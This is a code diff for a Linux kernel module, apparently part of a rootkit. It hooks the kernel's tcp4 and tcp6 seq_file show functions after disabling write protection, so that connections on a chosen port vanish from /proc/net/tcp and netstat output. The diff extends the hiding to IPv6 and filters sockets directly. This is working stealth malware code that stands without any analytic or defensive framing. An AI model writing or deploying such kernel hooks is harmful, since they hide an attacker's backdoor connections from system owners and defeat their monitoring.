@@ -1,24 +1,25 @@
 #include <linux/kernel.h>
 #include <linux/seq_file.h>
+#include <net/inet_sock.h>
+#include <linux/byteorder/generic.h>
 
 #include "common.h"
 #include "hook.h"
 
 #define SIZE_PORT_COLON 6
 
-const char *netstat_sep = "\n";
-
 typedef unsigned short port_t;
 
 //TODO add list with [PROTO:PORT] structs
-static port_t to_hide = 41821;
+static port_t to_hide = 46333;
 
 static int (*tcp4_seq_show)(struct seq_file *seq, void *v);
 static int (*udp4_seq_show)(struct seq_file *seq, void *v);
 static int (*tcp6_seq_show)(struct seq_file *seq, void *v);
 static int (*udp6_seq_show)(struct seq_file *seq, void *v);
 
-static int g7_tcp4_seq_show(struct seq_file *seq, void *v);
+static int g7_tcp4_seq_show(struct seq_file *, void *);
+static int g7_tcp6_seq_show(struct seq_file *, void *);
 
 void
 hook_show(void)
@@ -26,12 +27,16 @@ hook_show(void)
     tcp4_seq_show 
         = ((struct seq_operations *)kallsyms_lookup_name("tcp4_seq_ops"))->show;
 
+    tcp6_seq_show 
+        = ((struct seq_operations *)kallsyms_lookup_name("tcp6_seq_ops"))->show;
+
     disable_protection();
     ((struct seq_operations *)kallsyms_lookup_name("tcp4_seq_ops"))->show
         = (void *)g7_tcp4_seq_show;
-    enable_protection();
     
-    DEBUG_INFO("tcp4 show has been hooked!\n");
+    ((struct seq_operations *)kallsyms_lookup_name("tcp6_seq_ops"))->show
+        = (void *)g7_tcp6_seq_show;
+    enable_protection();    
 }
 
 void
@@ -40,38 +45,50 @@ unhook_show(void)
     disable_protection();
     ((struct seq_operations *)kallsyms_lookup_name("tcp4_seq_ops"))->show
         = (void *)tcp4_seq_show;
+
+    ((struct seq_operations *)kallsyms_lookup_name("tcp6_seq_ops"))->show
+        = (void *)tcp6_seq_show;
     enable_protection();
 }
 
-//Hide by removing the appropriate line and decreasing the sequence number accordingly
-//Sequence number is always 4 digits for tcp (e.g.: https://elixir.bootlin.com/linux/v4.19/source/net/ipv6/tcp_ipv6.c#L1884)
-static void
-hide_netstat_tcp(char *port, struct seq_file *seq)
-{
-    char *tok;
-    char *cur = seq->buf;
-
-    char ret_buf[seq->size];
-
-    while((tok = strsep(&cur, netstat_sep))) {
-        //doStuff
-    }
-}
-
-//seq includes all the info we need
+//seq and v include all the info we need
 //https://elixir.bootlin.com/linux/v4.19/source/include/linux/seq_file.h#L16
+//https://elixir.bootlin.com/linux/v4.19/source/net/ipv4/tcp_ipv4.c#L2385
 static int
 g7_tcp4_seq_show(struct seq_file *seq, void *v)
 {
-    int ret = tcp4_seq_show(seq, v);
+    //SEQ_START_TOKEN is used to indicate that a 
+    //header will be returned first
+    if(v == SEQ_START_TOKEN)
+        return tcp4_seq_show(seq, v);
 
-    //Ports are displayed as uppercase hex
-    //Since we don't want to detect random hex strings, we add the colon
-    char hex_port[SIZE_PORT_COLON];
-    sprintf(hex_port, ":%04X", to_hide);
+    struct sock *sk = v;
+    const struct inet_sock *inet = inet_sk(sk);
 
-    if(strstr(seq->buf, hex_port))
-       hide_netstat_tcp(hex_port, seq);
+    port_t src = ntohs(inet->inet_sport);
+    port_t dst = ntohs(inet->inet_dport);
+
+    if(src == to_hide || dst == to_hide)
+        return 0;
     
-    return ret;
+    return tcp4_seq_show(seq, v);
+}
+
+//This is basically the same as above
+static int
+g7_tcp6_seq_show(struct seq_file *seq, void *v)
+{
+    if(v == SEQ_START_TOKEN)
+        return tcp6_seq_show(seq, v);
+
+    struct sock *sk = v;
+    const struct inet_sock *inet = inet_sk(sk);
+
+    port_t src = ntohs(inet->inet_sport);
+    port_t dst = ntohs(inet->inet_dport);
+
+    if(src == to_hide || dst == to_hide)
+        return 0;
+    
+    return tcp6_seq_show(seq, v);
 }
